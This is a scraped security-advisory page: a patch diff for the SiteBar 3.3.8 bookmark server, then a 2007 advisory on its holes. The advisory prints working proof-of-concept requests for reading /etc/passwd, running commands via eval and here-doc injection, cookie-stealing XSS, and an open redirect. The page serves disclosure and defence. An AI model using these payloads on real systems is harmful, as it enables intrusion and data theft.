$fields['-hidden0-'] = array('name'=>'nid\_acl','value'=>$node->id);
$fields['Parent Folder'] = array('name'=>'parent',
'value'=>$node->name,'disabled'=>null);
@@ -4604,7 +4614,7 @@
function commandAddLink()
{
- $nid = SB\_reqVal('nid\_acl',true);
+ $nid = SB\_reqValInt('nid\_acl',true);
$node = $this->tree->getNode($nid);
if (!$node) return;
@@ -4639,7 +4649,7 @@
if (!$page->isDead && $page->errorCode['FAVURL']<PP\_ERR)
{
$favicon = $page->info['FAVURL'];
- $favurl = 'favicon.php?' . md5($favicon) . '=' . SB\_reqVal('lid\_acl');
+ $favurl = 'favicon.php?' . md5($favicon) . '=' . SB\_reqValInt('lid\_acl');
$this->message = SB\_T('Favicon <img src="%s"> found at url %s.', array($favurl, $url));
}
else
@@ -4675,7 +4685,7 @@
function commandMarkasDefault()
{
- $this->um->setParam('user','default\_folder',SB\_reqVal('nid\_acl'));
+ $this->um->setParam('user','default\_folder',SB\_reqValInt('nid\_acl'));
$this->um->saveUserParams();
exit;
}
@@ -4712,7 +4722,7 @@
if ($this->command!='Add Link')
{
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if (!$link) return null;
}
else
@@ -4805,7 +4815,7 @@
}
else
{
- $fields['-raw2-'] = $this->\_buildFavicon(SB\_reqVal('lid\_acl'), $link->favicon);
+ $fields['-raw2-'] = $this->\_buildFavicon(SB\_reqValInt('lid\_acl'), $link->favicon);
}
}
}
@@ -4910,7 +4920,7 @@
{
if (SB\_reqVal('private'))
{
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if (!$link) return;
if (!$this->tree->inMyTree($link->id\_parent))
{
@@ -4941,7 +4951,7 @@
else
{
// Delete old URL favicon from cache on update to allow new version
- $fc->purge(SB\_reqVal('lid\_acl'));
+ $fc->purge(SB\_reqValInt('lid\_acl'));
}
}
@@ -4962,13 +4972,13 @@
$update['is\_dead'] = 0;
}
- $this->tree->updateLink(SB\_reqVal('lid\_acl', true), $update);
+ $this->tree->updateLink(SB\_reqValInt('lid\_acl', true), $update);
}
function buildExportDescription()
{
$fields['Decode Using'] = array('type'=>'callback', 'function'=>'\_buildDecodeUsing');
- $fields['-hidden1-'] = array('name'=>'lid\_acl','value'=>SB\_reqVal('lid\_acl'));
+ $fields['-hidden1-'] = array('name'=>'lid\_acl','value'=>SB\_reqValInt('lid\_acl'));
return $fields;
}
@@ -4984,7 +4994,7 @@
function commandExportDescription()
{
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if (!strlen($link->comment))
{
$this->error('Cannot export empty description!');
@@ -5019,7 +5029,7 @@
{
$fields['Description File'] = array('type'=>'file','name'=>'file');
$fields['Encode Using'] = array('type'=>'callback', 'function'=>'\_buildEncodeUsing');
- $fields['-hidden1-'] = array('name'=>'lid\_acl','value'=>SB\_reqVal('lid\_acl'));
+ $fields['-hidden1-'] = array('name'=>'lid\_acl','value'=>SB\_reqValInt('lid\_acl'));
return $fields;
}
@@ -5039,7 +5049,7 @@
return;
}
$filename = $\_FILES['file']['tmp\_name'];
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if ($this->hasErrors())
{
@@ -5109,7 +5119,7 @@
function commandDeleteLink()
{
- $link = $this->tree->getLink(SB\_reqVal('lid\_acl'));
+ $link = $this->tree->getLink(SB\_reqValInt('lid\_acl'));
if (!$link)
{
@@ -5135,7 +5145,7 @@
function buildSecurity()
{
$fields = array();
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
$fields['Folder Name'] = array('name'=>'name','value'=>$node->name,'disabled'=>null);
$fields['Security'] = array('type'=>'callback',
@@ -5263,7 +5273,7 @@
{
$groups = $this->um->getGroups();
$myGroups = $this->um->getUserGroups();
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
$sameACL = true;
$updated = 0;
@@ -5335,7 +5345,7 @@
function buildValidateLinks()
{
$fields = array();
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
if (!$node) return null;
$fields['Folder Name'] = array('name'=>'name','maxlength'=>255,
@@ -5370,7 +5380,7 @@
function buildValidation()
{
$fields = array();
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
if (!$node) return null;
require\_once('./inc/validator.inc.php');
@@ -5415,7 +5425,7 @@
function buildImportBookmarks()
{
$fields = array();
- $node = $this->tree->getNode(SB\_reqVal('nid\_acl',true));
+ $node = $this->tree->getNode(SB\_reqValInt('nid\_acl',true));
$loaders['auto'] = array('', true);
$dirName = './inc/loaders';
@@ -5535,7 +5545,7 @@
'Imported %s link(s) into %s folder(s) from the bookmark file.',
array($bm->importedLinks, $bm->importedFolders));
- $this->tree->importTree(SB\_reqVal('nid\_acl'), $bm->root, SB\_reqChk('rename'));
+ $this->tree->importTree(SB\_reqValInt('nid\_acl'), $bm->root, SB\_reqChk('rename'));
}
function optionalExportBookmarks()
@@ -5623,7 +5633,7 @@
if (!SB\_reqChk('doall'))
{
- $fields['-hidden1-'] = array('name'=>'nid\_acl','value'=>SB\_reqVal('nid\_acl'));
+ $fields['-hidden1-'] = array('name'=>'nid\_acl','value'=>SB\_reqValInt('nid\_acl'));
}
else
{
@@ -5681,9 +5691,9 @@
}
}
- if (SB\_reqChk('nid\_acl') && SB\_reqVal('nid\_acl')>0)
+ if (SB\_reqChk('nid\_acl') && SB\_reqValInt('nid\_acl')>0)
{
- $params[] = 'root=' . SB\_reqVal('nid\_acl');
+ $params[] = 'root=' . SB\_reqValInt('nid\_acl');
}
if (count($params))
@@ -5718,7 +5728,7 @@
if (!SB\_reqChk('doall'))
{
- $fields['-hidden1-'] = array('name'=>'nid\_acl','value'=>SB\_reqVal('nid\_acl'));
+ $fields['-hidden1-'] = array('name'=>'nid\_acl','value'=>SB\_reqValInt('nid\_acl'));
}
else
{
Index: google.php
===================================================================
--- google.php (revision 0)
+++ google.php (revision 0)
@@ -0,0 +1,67 @@
+<?php
+
+/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\*\*\*\*\*\*
+ \* SiteBar 3 - The Bookmark Server for Personal and Team Use. \*
+ \* Copyright (C) 2006 Ondrej Brablc <http://brablc.com/mailto?o> \*
+ \* \*
+ \* This program is free software; you can redistribute it and/or modify \*
+ \* it under the terms of the GNU General Public License as published by \*
+ \* the Free Software Foundation; either version 2 of the License, or \*
+ \* (at your option) any later version. \*
+ \* \*
+ \* This program is distributed in the hope that it will be useful, \*
+ \* but WITHOUT ANY WARRANTY; without even the implied warranty of \*
+ \* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the \*
+ \* GNU General Public License for more details. \*
+ \* \*
+ \* You should have received a copy of the GNU General Public License \*
+ \* along with this program; if not, write to the Free Software \*
+ \* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA \*
+ \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\*\*\*\*/
+
+header("Content-type: text/xml");
+echo '<?xml version="1.0" encoding="UTF-8" ?>'."n";
+?>
+<Module>
+ <ModulePrefs
+ title="SiteBar"
+ description="SiteBar Bookmark Manager"
+ author="Ondrej Brablc"
+ author\_affiliation="SiteBar.org"
+ author\_location="Prague, Czech Republic"
+ title\_url="http://www.sitebar.org/"
+ category="communication"
+ category2="tools"
+ />
+ <Content type="html">
+ <![CDATA[
+<?php
+ $height = "400px";
+ if (isset($\_GET['height']))
+ {
+ if (preg\_match('/^(d+)(.\*)?$/',$\_GET['height'],$reg))
+ {
+ $height = $reg[1];
+ if ($reg[2] == '%')
+ {
+ $height .= '%';
+ }
+ else
+ {
+ $height .= 'px';
+ }
+ }
+ }
+
+ require\_once('./inc/errorhandler.inc.php');
+ require\_once('./inc/page.inc.php');
+ require\_once('./inc/usermanager.inc.php');
+
+ $um = SB\_UserManager::staticInstance();
+ $url = SB\_Page::absBaseUrl();
+?>
+ <iframe style="border: none; width:100%;height:<?php echo $height;?>"
+ src="<?php echo $url;?>?target=\_top" />
+ ]]>
+ </Content>
+</Module>
Index: inc/database.inc.php
===================================================================
--- inc/database.inc.php (revision 412)
+++ inc/database.inc.php (working copy)
@@ -18,7 +18,7 @@
\* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA \*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\*\*\*\*/
-define ( 'SB\_CURRENT\_RELEASE', '3.3.8');
+define( 'SB\_CURRENT\_RELEASE', '3.3.9');
require\_once('./inc/errorhandler.inc.php');
@@ -209,10 +209,12 @@
function fetchRecord($request, $binary = false)
{
+ $this->sw->cont();
$record = $this->fetchArray($request);
if (!$record)
{
+ $this->sw->pause();
return false;
}
else
@@ -221,12 +223,14 @@
{
array\_walk($record, array( $this, '\_unescape'));
}
+ $this->sw->pause();
return $record;
}
}
function fetchRecords($request)
{
+ $this->sw->cont();
$records = array();
while (($record = $this->fetchArray($request)))
@@ -235,6 +239,7 @@
$records[] = $record;
}
+ $this->sw->pause();
return $records;
}
Index: inc/errorhandler.inc.php
===================================================================
--- inc/errorhandler.inc.php (revision 412)
+++ inc/errorhandler.inc.php (working copy)
@@ -27,7 +27,7 @@
// Please note that the http server must have rights to write to the file
// specified bellow. You may change the log file path here.
define('SB\_LOG\_FILE\_PATH', 'sitebar.log');
-define('SB\_SHOW\_PHP\_ERRORS', SB\_DEBUGGING);
+define('SB\_SHOW\_PHP\_ERRORS', false);
define('SB\_LOG\_HTTP', SB\_DEBUGGING && false);
define('SB\_LOG\_SQL', SB\_DEBUGGING && false);
Index: inc/loaders/netscape.inc.php
===================================================================
--- inc/loaders/netscape.inc.php (revision 412)
+++ inc/loaders/netscape.inc.php (working copy)
@@ -61,7 +61,7 @@
$line = $this->toUTF8($line);
// Open node
- if (preg\_match('/<DT.\*><H3([^>]\*)>([^<]+)</H3>/i', $line, $reg ))
+ if (preg\_match('/<DT.\*><H3([^>]\*)>([^<]\*)</H3>/i', $line, $reg ))
{
$rec = array();
$params = $reg[1];
@@ -78,7 +78,7 @@
}
// Add link to current node
- if (preg\_match('/<DT.\*><A HREF="([^"]+)"([^>]\*)>([^<]+)</A>/i',$line, $reg ))
+ if (preg\_match('/<DT.\*><A HREF="([^"]+)"([^>]\*)>([^<]\*)</A>/i',$line, $reg ))
{
$rec = array();
$rec['url'] = $reg[1];
@@ -126,7 +126,7 @@
$comment = $this->toUTF8($reg[1]);
$line = array\_shift($this->lines);
- while (count($this->lines) && !preg\_match('/</?DL>/i', $line ))
+ while (count($this->lines) && !preg\_match('/</?D[LT]>/i', $line ))
{
$comment .= "r".$this->toUTF8($line);
$line = array\_shift($this->lines);
Index: inc/page.inc.php
===================================================================
--- inc/page.inc.php (revision 412)
+++ inc/page.inc.php (working copy)
@@ -62,6 +62,16 @@
return $is?$\_REQUEST[$name]:$default;
}
+function SB\_reqValInt($name, $mandatory=false, $default='')
+{
+ $is = SB\_reqChk($name);
+ if ($mandatory && !$is)
+ {
+ die('Expected field "'. $name .'" was not filled!');
+ }
+ return $is?intval($\_REQUEST[$name]):$default;
+}
+
function SB\_setVal($name, $value)
{
$\_REQUEST[$name]=$value;
@@ -424,7 +434,15 @@
if ($trg === null)
{
$target = (SB\_Page::isMSIE()||SB\_Page::isOPERA()?'\_main':'\_content');
- if (isset($\_REQUEST['target'])) $target = $\_REQUEST['target'];
+ if (isset($\_REQUEST['target']))
+ {
+ $newtarget = $\_REQUEST['target'];
+
+ if (preg\_match('/^w+/', $newtarget))
+ {
+ $target = $newtarget;
+ }
+ }
$trg = $target;
}
return $trg;
Index: inc/tree.inc.php
===================================================================
--- inc/tree.inc.php (revision 412)
+++ inc/tree.inc.php (working copy)
@@ -651,9 +651,22 @@
if (SB\_ALL\_LINKS\_FOR\_ID != $uid)
{
+ // Ignore deleted roots (of other owners)
$where = array('^1'=>'uid <> '.$uid, '^2'=>'AND', 'deleted\_by'=>null);
- // Ignore deleted roots (of other owners)
+ // We use cache, if it is not defined now, it will be defined next time
+ // !! PERFORMANCE
+ // If users are playing too much with ACL, this would be slow as well,
+ // because cache is always deleted.
+ $vis\_nodes = $this->db->getCache('vis\_nodes',$uid);
+ if (is\_array($vis\_nodes))
+ {
+ if (strlen($vis\_nodes['cvalue'])>0)
+ {
+ $where['^3']='AND r.nid in ('.$vis\_nodes['cvalue'].')';
+ }
+ }
+
$rset = $this->db->select( $select, $from, $where);
// Check all roots - can be slow with many users
@@ -987,8 +1000,8 @@
return $aclNodes;
}
- $rset = $this->db->select('distinct nid', 'sitebar\_acl',
- array( '^1'=> 'gid in ('.implode(',',$gids).')'));
+ $rset = $this->db->select('distinct a.nid', 'sitebar\_acl a join sitebar\_node n',
+ array( '^1'=> 'gid in ('.implode(',',$gids).') and a.nid=n.nid and deleted\_by IS NULL'));
$aclNodes = array();
while (($rec=$this->db->fetchRecord($rset)))
Index: inc/writers/blogroll.inc.php
===================================================================
--- inc/writers/blogroll.inc.php (revision 412)
+++ inc/writers/blogroll.inc.php (working copy)
@@ -48,7 +48,7 @@
function js($value)
{
- return "document.writeln('" . str\_replace('"','"',$value) . "');r";
+ return "document.writeln('" . str\_replace("'","\'",$value) . "');r";
}
function drawHead()
Index: inc/writers/opera.inc.php
===================================================================
--- inc/writers/opera.inc.php (revision 412)
+++ inc/writers/opera.inc.php (working copy)
@@ -46,7 +46,7 @@
echo "tNAME=".$node->name."r";
if ($node->comment)
{
- echo "tDESCRIPTION=".$node->comment."r";
+ echo "tDESCRIPTION=".$this->quoteComment($node->comment)."r";
}
echo "r";
}
@@ -56,6 +56,14 @@
echo "-rr";
}
+ function quoteComment(&$comment)
+ {
+ $comment = str\_replace("rn","x2", $comment);
+ $comment = str\_replace("n","x2", $comment);
+ $comment = str\_replace("r","x2", $comment);
+ return $comment;
+ }
+
function drawLink(&$node, &$link)
{
echo "#URLr";
@@ -63,7 +71,7 @@
echo "tURL=".$link->url."r";
if ($link->comment)
{
- echo "tDESCRIPTION=".$link->comment."r";
+ echo "tDESCRIPTION=".$this->quoteComment($link->comment)."r";
}
echo "r";
}
Index: inc/writers/rss.inc.php
===================================================================
--- inc/writers/rss.inc.php (revision 412)
+++ inc/writers/rss.inc.php (working copy)
@@ -79,7 +79,7 @@
$this->drawTag('generator', null, 'SiteBar ' . SB\_CURRENT\_RELEASE . ' (Bookmark Server; http://sitebar.org/)');
// Time to live in minutes
- $this->drawTag('ttl', null, null, '60');
+ $this->drawTag('ttl', null, '60');
}
function drawLink(&$node, &$link)
@@ -96,29 +96,33 @@
// $this->drawTag('author', null, null);
$this->drawTag('link', null, $this->quoteText($link->url));
- $this->drawTag('description', null, $this->quoteText($link->comment));
+ if (strlen($link->comment))
+ {
+ $this->drawTag('description', null, $this->quoteText($link->comment));
+ }
+
$date = '';
$append = '';
switch ($this->tree->sortMode)
{
case 'changed':
- $date = $this->getDateISO8601($link->changed);
+ $date = $link->changed;
$append = '#' . $date;
break;
case 'tested':
- $date = $this->getDateISO8601($link->tested);
+ $date = $link->tested;
$append = '#' . $date;
break;
case 'hits':
$append = '#' . $link->hits;
- $date = $this->getDateISO8601($link->visited);
+ $date = $link->visited;
break;
case 'visited':
- $date = $this->getDateISO8601($link->visited);
+ $date = $link->visited;
$append = '#' . $date;
break;
case 'added':
- $date = $this->getDateISO8601($link->added);
+ $date = $link->added;
break;
default:
$date = ($link->added>$link->changed?$link->added:$link->changed);
Index: integrator.php
===================================================================
--- integrator.php (revision 412)
+++ integrator.php (working copy)
@@ -54,7 +54,10 @@
SB\_Page::absBaseUrl($\_COOKIE['sbi\_url']);
SB\_Skin::set($\_COOKIE['sbi\_skin']);
-SB\_SetLanguage($\_GET['lang']);
+if (preg\_match('/^w+/', $\_GET['lang']))
+{
+ SB\_SetLanguage($\_GET['lang']);
+}
if (isset($\_REQUEST['install']))
{
@@ -102,7 +105,7 @@
(
'label' =>'Mozilla Firefox',
'homepage' =>'http://www.mozilla.org/products/firefox/',
- 'platforms'=>'1.0,1.5/WinXP,Linux',
+ 'platforms'=>'1.0,1.5,2.0/WinXP,Linux',
'usage' => '',
'exclude' =>array(),
'extra' =>array('sitebar\_client','bmsync','sitebar','sidebar','livebookmarks','m
ozlinker','search\_engine'),
@@ -173,7 +176,7 @@
'sitebar\_client' => array
(
'label' => 'SiteBar Client',
- 'url' => 'https://addons.mozilla.org/extensions/moreinfo.php?application=firefox&
amp;id=1545',
+ 'url' => 'https://addons.mozilla.org/firefox/3605/',
'desc' => SB\_P('integrator::hint\_sitebar'),
),
Index: news.php
===================================================================
--- news.php (revision 412)
+++ news.php (working copy)
@@ -24,6 +24,10 @@
SB\_handleRootCookie('news.php');
$\_REQUEST['w'] = 'news';
+
+require\_once('./inc/writers/xbel.inc.php');
+require\_once('./inc/writers/dir.inc.php');
+require\_once('./inc/writers/news.inc.php');
include('index.php');
?>
Index: sql/downgrade\_3.3.9.sql
===================================================================
--- sql/downgrade\_3.3.9.sql (revision 0)
+++ sql/downgrade\_3.3.9.sql (revision 0)
@@ -0,0 +1,2 @@
+UPDATE `sitebar\_config`
+ SET `release` = '3.3.8';
Index: sql/install.sql
===================================================================
--- sql/install.sql (revision 412)
+++ sql/install.sql (working copy)
@@ -18,7 +18,7 @@
CREATE TABLE `sitebar\_config` (
`gid\_admins` int(10) unsigned NOT NULL DEFAULT '1',
`gid\_everyone` int(10) unsigned NOT NULL DEFAULT '2',
- `release` varchar(10) NOT NULL DEFAULT '3.3.8',
+ `release` varchar(10) NOT NULL DEFAULT '3.3.9',
`changed` datetime NOT NULL default '0000-00-00 00:00:00',
`params` text
)
Index: sql/upgrade\_3.3.8.sql
===================================================================
--- sql/upgrade\_3.3.8.sql (revision 0)
+++ sql/upgrade\_3.3.8.sql (revision 0)
@@ -0,0 +1,2 @@
+UPDATE `sitebar\_config`
+ SET `release` = '3.3.9';
Index: translator.php
===================================================================
--- translator.php (revision 412)
+++ translator.php (working copy)
@@ -68,20 +68,20 @@
var $infofmt = './locale/%s/%s';
var $langs = array();
var $gid = null;
- var $dir = '.';
- var $dirCGI = '';
+ var $plugin = '';
+ var $pluginCGI = '';
function Translator()
{
- if (isset($\_GET['dir']) || isset($\_POST['dir']))
+ if (isset($\_GET['plugin']) || isset($\_POST['plugin']))
{
- $dir = isset($\_GET['dir'])?$\_GET['dir']:$\_POST['dir'];
+ $plugin = isset($\_GET['plugin'])?$\_GET['plugin']:$\_POST['plugin'];
- if ($dir != "." && $dir != "")
+ if ($plugin != "" && preg\_match('/^w+$/', $plugin))
{
- $this->dir = $dir;
+ $this->dir = './plugins/'.$plugin;
$this->fmt = $this->dir.'/locale/%s/%s';
- $this->dirCGI = "dir=".$this->dir."&";
+ $this->pluginCGI = "plugin=".$plugin."&";
}
}
@@ -283,8 +283,8 @@
<form method="get">
Translate
-<select name='dir' onChange="this.form.submit()">
-<option value='.'>SiteBar</option>
+<select name='plugin' onChange="this.form.submit()">
+<option value=''>SiteBar</option>
<?php
$dir = opendir('./plugins');
@@ -308,7 +308,7 @@
continue;
}
- echo "<option ". ($\_GET['dir']==$plugdir?"selected":"") ." value='$plugdir'>Plugin $plugin</option>n";
+ echo "<option ". ($\_GET['plugin']==$plugin?"selected":"") ." value='$plugin'>Plugin $plugin</option>n";
}
closedir($dir);
?>
@@ -443,9 +443,9 @@
if ($lang!=DEFAULT\_LANGUAGE)
{
- ?>[<a href='translator.php?lang=<?php echo $lang?>&<?php echo $this->dirCGI ?>edit=<?php echo $part?>'>EDIT</a>]<?php
-if ($missing) : ?><br>[<a href='translator.php?lang=<?php echo $lang?>&<?php echo $this->dirCGI ?>cmd=add&edit=<?php echo $part?>'>ADD</a>]<?php endif;
-if ($update && !$this->parts[$part]['inline']) : ?><br>[<a href='translator.php?lang=<?php echo $lang?>&<?php echo $this->dirCGI ?>cmd=upd&edit=<?php echo $part?>'>UPD</a>]<?php endif;
+ ?>[<a href='translator.php?lang=<?php echo $lang?>&<?php echo $this->pluginCGI ?>edit=<?php echo $part?>'>EDIT</a>]<?php
+if ($missing) : ?><br>[<a href='translator.php?lang=<?php echo $lang?>&<?php echo $this->pluginCGI ?>cmd=add&edit=<?php echo $part?>'>ADD</a>]<?php endif;
+if ($update && !$this->parts[$part]['inline']) : ?><br>[<a href='translator.php?lang=<?php echo $lang?>&<?php echo $this->pluginCGI ?>cmd=upd&edit=<?php echo $part?>'>UPD</a>]<?php endif;
}
}
}
@@ -453,7 +453,7 @@
$server = defined("DOWNLOAD\_SRV")?DOWNLOAD\_SRV:"";
?>
- <td class='stat'>[<a href='<?php echo $server?>translator.php?<?php echo $this->dirCGI ?>download=<?php echo $lang?>'>Download</a>]</td>
+ <td class='stat'>[<a href='<?php echo $server?>translator.php?<?php echo $this->pluginCGI ?>download=<?php echo $lang?>'>Download</a>]</td>
</tr>
<?php
}
@@ -486,15 +486,22 @@
SB\_Page::head('Edit Translation', 'locale');
?>
<h2>Edit Translation</h2>
-[<a href="translator.php?<?php echo $this->dirCGI ?>">Back to Translation List</a>]
+[<a href="translator.php?<?php echo $this->pluginCGI ?>">Back to Translation List</a>]
<p>
<?php
+ if (!isset($this->parts[$part]))
+ {
+ die("Unknown part in edit param!");
+ }
+
+ if (!preg\_match('/^w+$/',$lang))
+ {
+ die("Not allowed characters in lang param!");
+ }
+
$param = $this->parts[$part];
$file = sprintf($this->fmt,$lang,$param['file']);
- mkdir($this->dir.'/locale/'.$lang, 0777);
- chmod($this->dir.'/locale/'.$lang, 0777);
-
include($file);
eval('$data = $'.$part.';');
eval('$'.$part.'=array();');
@@ -572,9 +579,17 @@
else
{
$value = str\_replace("rn","n", $value);
- fwrite( $fh, "$".$part."['".$label."'] = <<<\_Pn");
+ fwrite( $fh, "$".$part."['".$label."'] = <<<\_SBHDn");
+
+ // Do not allow here doc to be included in the string,
+ // otherwise any php code would be executed.
+ if (strstr($value,"\_SBHD"))
+ {
+ die("Value must not contain \_SBHD pattern!");
+ }
+
fwrite( $fh, $value);
- fwrite( $fh, "n\_P;nn");
+ fwrite( $fh, "n\_SBHD;nn");
}
}
}
@@ -601,6 +616,7 @@
<table class="edit">
<input type="hidden" name="dir" value="<?php $this->dir ?>">
<?php
+
$i = 0;
foreach ($default as $label => $value)
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Nth Dimension Security Advisory (NDSA20071016)
Date: 16th October 2007
Author: Tim Brown <mailto:timb (at) nth-dimension.org (dot) uk [email concealed]>
URL: <http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>
Product: SiteBar 3.3.8 <http://www.sitebar.org/>
Vendor: Ond&#197;?ej Brablc, David Szego and SiteBar Team <http://www.sitebar.org/>
Risk: High
Summary
This advisory comes in 4 related parts:
1) SiteBar application has single high risk issues with its translation
module. It can can be made to retrieve any file to which the web server user
has read access.
2) SiteBar application has multiple high risk issues with its translation
module. It can be made to execute arbitrary code to gain remote access
as the web server user typically nobody.
3) SiteBar application has multiple medium risk issues where it is vulnerable
to Javascript injection within the requested URL.
4) SiteBar application has single medium risk issue where it is vulnerable to
malicious redirects within the requested URL.
Technical Details
1) The SiteBar application translation module can be made to read any
arbitrary file that the web server user has read access to, as it makes
no sanity checks on the value passed within the dir parameter of the URL,
for example:
http://192.168.1.1/translator.php?dir=/etc/passwd%00
Note the use of %00 to terminate the malicious and so prevent the intended
string concatenation occuring.
2) The SiteBar application translation module can be forced into code
execution can occur in one of two ways. Firstly, it makes no sanity checks
on the value passed within the edit parameter prior to using the value as
part of an eval() call, for example:
http://192.168.1.1/translator.php?lang=zh\_CN&cmd=upd&edit=$GET[%22lang%2
2];system(%22uname%20-a%22);
Secondly, whilst modifying strings within a translation, it makes no sanity
checks on the value passed for a given string to be embedded within a HERE
document within the languages strings library. It is therefore possible to
terminate the HERE document and pass arbitrary code which will be executed
whenever the languages strings library is included, for example:
POST http://192.168.1.1/translator.php?lang=test&edit=text HTTP/1.1
Host: 192.168.1.1
Referer: http://192.168.1.1/translator.php?lang=test&edit=text
Cookie: SB3COOKIE=1; SB3AUTH=3efab8d1dc9a149d7d1d7866a33d2539
Content-Type: application/x-www-form-urlencoded
Content-length: 47497
dir=&label%5B0%5D=The+Bookmark+Server+for+Personal+and+Team+Use&md5%5B0%
5D=823084516ae27478ec4c5fd40fb32ea8&value%5B0%5D=\_P;
system('id');
?>
Note that \_P terminates the HERE document.
3) The values of the URL requested are used in within the web pages returned
by the various scripts, in their unsanitised form. Specifically, it makes
no sanity checks on the value passed within the multiple parameters of the
URL, for example:
http://192.168.1.1/integrator.php?lang="><script>alert('xss')</script> - Allows '
http://192.168.1.1/command.php?command=New+Password&uid=&token="><script
>alert(document.cookie)</script> - Does not allow '
http://192.168.1.1/command.php?command=Folder%20Properties&nid\_acl=%3Csc
ript%3Ealert(document.cookie)%3C/script%3E - Does not allow '
http://192.168.1.1/index.php?target=%22%3E%3Cscript%3Ealert(document.coo
kie)%3C/script%3E - Does not allow '
http://192.168.1.1/command.php?command='%3Cscript%3Ealert(document.cooki
e)%3C/script%3E - Does not allow ', this one turned out to be CVE-2006-3320.
http://192.168.1.1/command.php?command=Modify%20User&uid=%22%3E%3Cscript
%3Ealert('xss')%3C/script%3E - Allows '
Note that CVE-2006-3320 had not been resolved at the time of testing, in
September 2007, and so we included it in our vulnerability report to the vendor
for completeness.
4) Finally, the SiteBar can be made to redirect users to malicious locations,
as it makes no checks on the value passed within the forward parameter of the URL,
for example:
http://192.168.1.1/command.php?command=Log%20In&forward=http://www.googl
e.com/
Solutions
Following vendor notification on the 27th September 2007, the vendor promptly
responded with an initial patch on the 7th October which has been attached along
with this advisory and which resolved the reported issues. Nth Dimension would
recommend applying this patch as soon as possible. Alternatively, from 3.3.9
(available at http://sitebar.org/downloads.php) onwards also include this patch.
Nth Dimension would like to thank Ondraj from the SiteBar team for the way he
worked to resolve the issue.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
iD8DBQFHFo3OVAlO5exu9x8RAhLWAJ0Vw4cessVBHnFMswYp6aDlmriDnwCfXpil
wyDF4P/iRQ5Ab7FqJFutWBA=
=Oqb/
-----END PGP SIGNATURE-----

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007100139)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_38a31ec8_20250126_021023.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_245a2afe_20250126_021023.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from bugs.gentoo.org_deccdc35_20250126_021026.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Search by bug number

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?keywords=i&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?keywords=i&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

You may find a single bug by entering its bug id here:

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

